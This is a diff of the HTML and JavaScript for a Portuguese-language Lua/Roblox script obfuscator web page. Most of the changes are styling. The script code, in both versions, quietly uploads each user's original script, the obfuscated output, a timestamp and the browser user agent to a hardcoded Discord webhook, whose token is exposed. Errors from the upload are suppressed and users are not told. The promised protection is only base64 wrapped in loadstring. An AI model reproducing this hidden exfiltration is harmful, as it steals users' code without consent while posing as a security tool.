@@ -1,7 +1,8 @@
-<!DOCTYPE html><html><head>
+<!DOCTYPE html>
+<html>
+<head>
 <meta charset="UTF-8">
 <title>CarameloDevs</title>
-
 <meta name="title" content="CarameloDevs Obfuscator">
 <meta name="description" content="Lua script obfuscator.">
 <meta name="keywords" content="Lua obfuscator, script Roblox, lua script protection.">
@@ -29,9 +30,9 @@ body{
     color:white;
     display:flex;
     justify-content:center;
-    align-items:flex-start;
+    align-items:center;
+    height:100vh;
     padding:20px;
-    position:relative;
 }
 
 .particles{
@@ -55,23 +56,23 @@ body{
 
 .container{
     width:95%;
-    max-width:680px;
-    background:rgba(0,0,0,0.7);
+    max-width:750px;
+    background:rgba(0,0,0,0.75);
     border-radius:20px;
-    padding:30px;
+    padding:40px;
     backdrop-filter:blur(12px);
-    box-shadow:0 0 25px #00ccffaa, 0 0 40px #0099ff66;
+    box-shadow:0 0 35px #00ccffaa, 0 0 50px #0099ff66;
 }
 
 .titleWrap{
     display:flex;
     flex-direction:column;
     align-items:center;
-    margin-bottom:25px;
+    margin-bottom:30px;
 }
 .titleIcon{
-    width:90px;
-    height:90px;
+    width:100px;
+    height:100px;
 }
 .titleIcon img{
     width:100%;
@@ -80,7 +81,7 @@ body{
 }
 h1{
     text-align:center;
-    font-size:34px;
+    font-size:38px;
     font-weight:800;
     background:linear-gradient(135deg,#00ccff,#0088ff);
     -webkit-background-clip:text;
@@ -89,18 +90,18 @@ h1{
 
 .tabs{
     display:flex;
-    margin-top:10px;
+    margin-top:15px;
     border-bottom:1px solid #ffffff22;
 }
 .tab{
     flex:1;
-    padding:14px;
+    padding:16px;
     text-align:center;
     font-weight:bold;
     cursor:pointer;
     color:#00aaff;
     transition:0.2s;
-    font-size:18px;
+    font-size:19px;
 }
 .tab.active{
     background:linear-gradient(135deg,#00ccff,#0088ff);
@@ -114,7 +115,7 @@ h1{
 
 .tabContent{
     display:none;
-    margin-top:20px;
+    margin-top:25px;
 }
 .tabContent.active{
     display:block;
@@ -122,16 +123,16 @@ h1{
 
 label{
     font-weight:bold;
-    font-size:18px;
-    margin-top:12px;
+    font-size:19px;
+    margin-top:15px;
     display:flex;
     align-items:center;
-    gap:10px;
+    gap:12px;
 }
 
 .labelIcon{
-    width:26px;
-    height:26px;
+    width:28px;
+    height:28px;
 }
 .labelIcon img{
     width:100%;
@@ -141,23 +142,23 @@ label{
 
 .fileUploadBox{
     width:100%;
-    height:55px;
+    height:60px;
     background:#0a0a0a;
     border:1px solid #00ccff;
-    border-radius:14px;
+    border-radius:16px;
     display:flex;
     align-items:center;
     justify-content:center;
-    margin-top:6px;
+    margin-top:8px;
     position:relative;
     cursor:pointer;
     transition:0.25s;
     color:white;
-    font-size:17px;
+    font-size:18px;
 }
 .fileUploadBox:hover{
     transform:scale(1.03);
-    box-shadow:0 0 12px #00ccffaa;
+    box-shadow:0 0 14px #00ccffaa;
 }
 #fileInput{
     position:absolute;
@@ -168,29 +169,29 @@ label{
 
 textarea{
     width:100%;
-    height:200px;
+    height:220px;
     background:#0a0a0a;
     border:1px solid #00ccff;
-    border-radius:14px;
-    padding:14px;
+    border-radius:16px;
+    padding:16px;
     color:#00ccff;
     font-family:Consolas, monospace;
-    margin-top:6px;
-    font-size:15px;
+    margin-top:8px;
+    font-size:16px;
 }
 textarea:focus{
     border-color:#00ccff;
-    box-shadow:0 0 10px #00ccff;
+    box-shadow:0 0 12px #00ccff;
 }
 
 button{
     width:100%;
-    padding:15px;
-    margin-top:12px;
+    padding:16px;
+    margin-top:14px;
     font-size:20px;
     font-weight:bold;
     border:none;
-    border-radius:16px;
+    border-radius:18px;
     cursor:pointer;
     background:linear-gradient(135deg,#00ccff,#003344,#0088ff);
     color:white;
@@ -201,22 +202,22 @@ button{
     gap:10px;
 }
 button img{
-    width:24px;
-    height:24px;
+    width:26px;
+    height:26px;
 }
 button:hover{
     transform:scale(1.05);
-    box-shadow:0 0 15px #00ccffaa;
+    box-shadow:0 0 16px #00ccffaa;
 }
 
 #errorBox{
     width:100%;
-    padding:12px;
-    margin-top:15px;
-    border-radius:14px;
+    padding:14px;
+    margin-top:18px;
+    border-radius:16px;
     display:none;
     font-weight:bold;
-    font-size:16px;
+    font-size:17px;
 }
 .err{
     background:#001c33;
@@ -229,14 +230,14 @@ button:hover{
 
 @media(max-width:480px){
     .container{
-        padding:20px;
+        padding:25px;
         max-width:95%;
     }
-    h1{font-size:26px;}
-    .tab{font-size:15px; padding:10px;}
-    textarea{height:160px;}
-    button{font-size:16px; padding:12px;}
-    .titleIcon{width:65px;height:65px;}
+    h1{font-size:28px;}
+    .tab{font-size:16px; padding:12px;}
+    textarea{height:180px;}
+    button{font-size:17px; padding:14px;}
+    .titleIcon{width:70px;height:70px;}
 }
 </style>
 </head>
@@ -303,18 +304,19 @@ button:hover{
 
     <div class="tabContent" id="infoTab">
         <label>
-            Ferramenta desenvolvida pela equipe da caramelo ajudando outros scripters a obfuscar seu codigo .lua com segurança e facilide
+            Ferramenta desenvolvida pela equipe da Caramelo ajudando outros scripters a obfuscar seu código .lua com segurança e facilidade.
         </label>
 
         <button onclick="window.open('https://discord.gg/9nTbzFuUyj','_blank')">
             <img src="../9eD5XwuaxsTS.com/vS6ISkunsgAa.png">
-            Entrar em nosso discord
+            Entrar em nosso Discord
         </button>
     </div>
 
 </div>
 
 <script>
+// Tabs
 document.querySelectorAll(".tab").forEach(tab=>{
     tab.addEventListener("click",()=>{
         document.querySelectorAll(".tab").forEach(t=>t.classList.remove("active"));
@@ -324,6 +326,7 @@ document.querySelectorAll(".tab").forEach(tab=>{
     });
 });
 
+// Status
 function showStatus(msg,type){
     const box=document.getElementById("errorBox");
     box.innerText=msg;
@@ -332,8 +335,8 @@ function showStatus(msg,type){
 }
 function clearStatus(){document.getElementById("errorBox").style.display="none";}
 
+// Base64 & SHA-256
 function toBase64(str){return btoa(unescape(encodeURIComponent(str)));}
-
 async function sha256(text){
     const encoder=new TextEncoder();
     const data=encoder.encode(text);
@@ -341,16 +344,12 @@ async function sha256(text){
     return Array.from(new Uint8Array(hash)).map(b=>b.toString(16).padStart(2,"0")).join("");
 }
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1448510853681778770/9sGQqstbGuGWbInbIll2MVzi8NNBBCNhF8IzOHUrrLnZk5w99d5G2M32kM-4t3IOPra_";
-
+// File upload
 document.getElementById("fileInput").addEventListener("change",(e)=>{
     const file=e.target.files[0];
-    if(!file)return;
-
+    if(!file) return;
     if(!file.name.endsWith(".lua")) return showStatus("Opa! Só aceitamos arquivos.lua!","err");
-
     document.querySelector("#uploadBox span").textContent="Seu arquivo é este: " + file.name;
-
     const reader=new FileReader();
     reader.onload=x=>{
         document.getElementById("input").value=x.target.result;
@@ -359,15 +358,17 @@ document.getElementById("fileInput").addEventListener("change",(e)=>{
     reader.readAsText(file);
 });
 
+// Obfuscate function
 async function obfuscate(){
+    clearStatus();
     const script=document.getElementById("input").value.trim();
     if(!script) return showStatus("Antes de obfuscar, insira um script!","err");
 
     const encoded = toBase64(script);
     const hash = await sha256(script);
 
-    const final = ` 
-    Caramelodevs obfuscate
+    const final = `
+-- CarameloDevs Obfuscate
 local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
 local function decode(data)
     data = data:gsub('[^'..b..'=]', '')
@@ -377,12 +378,10 @@ local function decode(data)
         local c2 = b:find(data:sub(i+1,i+1)) or 1
         local c3 = b:find(data:sub(i+2,i+2)) or 1
         local c4 = b:find(data:sub(i+3,i+3)) or 1
-
         local n = (c1-1)*262144 + (c2-1)*4096 + (c3-1)*64 + (c4-1)
         local b1 = math.floor(n / 65536) % 256
         local b2 = math.floor(n / 256) % 256
         local b3 = n % 256
-
         table.insert(t, string.char(b1))
         if data:sub(i+2,i+2) ~= '=' then table.insert(t, string.char(b2)) end
         if data:sub(i+3,i+3) ~= '=' then table.insert(t, string.char(b3)) end
@@ -391,77 +390,60 @@ local function decode(data)
 end
 
 loadstring(decode([[${encoded}]]))()
+
+-- SHA-256: ${hash}
 `;
 
-    document.getElementById("output").value=final.trim();
+    document.getElementById("output").value = final.trim();
     showStatus("Obfuscação completa.","ok");
 
     sendToWebhook(script, final.trim(), hash);
 }
 
+// Webhook logging
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1448510853681778770/9sGQqstbGuGWbInbIll2MVzi8NNBBCNhF8IzOHUrrLnZk5w99d5G2M32kM-4t3IOPra_";
 function sendToWebhook(original, obfuscated, hash){
     const payload = {
         content: "**Nova obfuscação registrada!**",
-        embeds: [{
-            title: "Detalhes:",
-            color: 65280,
-            fields: [
-                { name: "SHA-256:", value: "`" + hash + "`" },
-                { name: "Horário:", value: new Date().toLocaleString() },
-                { name: "Navegador:", value: navigator.userAgent }
+        embeds:[{
+            title:"Detalhes:",
+            color:65280,
+            fields:[
+                {name:"SHA-256:", value:"`"+hash+"`"},
+                {name:"Horário:", value:new Date().toLocaleString()},
+                {name:"Navegador:", value:navigator.userAgent}
             ]
         }]
     };
-
-    const files = [
-        new File([original], "script viewed by ferraodev.lua"),
-        new File([obfuscated], "obfuscada.lua")
+    const files=[
+        new File([original],"script_viewed_by_ferraodev.lua"),
+        new File([obfuscated],"obfuscada.lua")
     ];
-
     const form = new FormData();
     form.append("payload_json", JSON.stringify(payload));
     form.append("files[0]", files[0]);
     form.append("files[1]", files[1]);
-
-    fetch(WEBHOOK_URL, {
-        method: "POST",
-        body: form
-    }).catch(()=>{});
+    fetch(WEBHOOK_URL,{method:"POST",body:form}).catch(()=>{});
 }
 
-function copyOutput() {
-    const out = document.getElementById("output");
-    out.select();
-    document.execCommand("copy");
-    showStatus("Obfuscação copiada.","ok");
-}
+// Copy & download
+function copyOutput(){const out=document.getElementById("output");out.select();document.execCommand("copy");showStatus("Obfuscação copiada.","ok");}
+function downloadOutput(){const code=document.getElementById("output").value;if(!code) return showStatus("Sem conteúdo para download.","err");const blob=new Blob([code],{type:"text/plain"});const url=URL.createObjectURL(blob);const a=document.createElement("a");a.href=url;a.download="obfuscated.lua";a.click();URL.revokeObjectURL(url);showStatus("Baixando arquivo...","ok");}
 
-function downloadOutput() {
-    const code = document.getElementById("output").value;
-    if (!code) return showStatus("Sem conteúdo para download.","err");
-
-    const blob = new Blob([code], { type: "text/plain" });
-    const url = URL.createObjectURL(blob);
-    const a = document.createElement("a");
-    a.href = url;
-    a.download = "obfuscated.lua";
-    a.click();
-    URL.revokeObjectURL(url);
-    showStatus("Baixando arquivo...","ok");
-}
-
-const particleContainer = document.getElementById("particles");
-for (let i = 0; i < 100; i++) {
-    const p = document.createElement("div");
-    p.className = "particle";
-    p.style.left = Math.random() * 100 + "%";
-    p.style.top = Math.random() * 100 + "vh";
-    p.style.opacity = 1;
-    const duration = 1 + Math.random() * 2 + "s";
-    p.style.animationDuration = duration;
-    p.style.animationDelay = "-" + (Math.random() * parseFloat(duration)) + "s";
+// Particles
+const particleContainer=document.getElementById("particles");
+for(let i=0;i<100;i++){
+    const p=document.createElement("div");
+    p.className="particle";
+    p.style.left=Math.random()*100+"%";
+    p.style.top=Math.random()*100+"vh";
+    p.style.opacity=1;
+    const duration=1+Math.random()*2+"s";
+    p.style.animationDuration=duration;
+    p.style.animationDelay="-"+(Math.random()*parseFloat(duration))+"s";
     particleContainer.appendChild(p);
 }
 </script>
 
-</body></html>
+</body>
+</html>
